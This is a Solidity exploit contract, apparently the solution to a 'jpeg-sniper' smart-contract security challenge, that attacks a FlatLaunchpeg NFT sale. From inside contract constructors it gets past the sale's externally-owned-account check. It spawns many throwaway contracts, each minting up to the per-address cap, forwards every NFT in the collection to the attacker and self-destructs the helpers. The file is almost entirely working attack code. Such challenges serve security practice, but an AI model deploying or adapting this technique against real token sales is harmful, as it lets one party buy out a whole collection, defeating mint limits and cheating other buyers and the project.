// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {FlatLaunchpeg} from "src/jpeg-sniper/FlatLaunchpeg.sol";

// attack by function in the constructor, because there is a EOA check

contract jpegSniperExploiter {
    constructor(address _nftAddress) {
        FlatLaunchpeg nft = FlatLaunchpeg(_nftAddress);
        attack(nft);
    }

    function attack(FlatLaunchpeg nft) public {
        uint256 collectionSize = nft.collectionSize();
        uint256 maxMintPerAddress = nft.maxPerAddressDuringMint();
        uint256 startIndex = nft.totalSupply();

        for (uint256 i; i < collectionSize / maxMintPerAddress; ++i) {
            new smallJpegSniperExploiter(nft, startIndex, msg.sender);
            startIndex += maxMintPerAddress;
        }

        uint256 rest = collectionSize % maxMintPerAddress;
        if (rest != 0) {
            nft.publicSaleMint(rest);
            for (uint256 k; k < rest; ++k) {
                nft.transferFrom(address(this), msg.sender, startIndex + k);
            }
        }
    }
}

contract smallJpegSniperExploiter {
    constructor(FlatLaunchpeg nft, uint256 startIndex, address owner) {
        nft.publicSaleMint(nft.maxPerAddressDuringMint());
        for (uint256 k; k < nft.maxPerAddressDuringMint(); ++k) {
            nft.transferFrom(address(this), owner, startIndex + k);
        }
        selfdestruct(payable(msg.sender));
    }
}
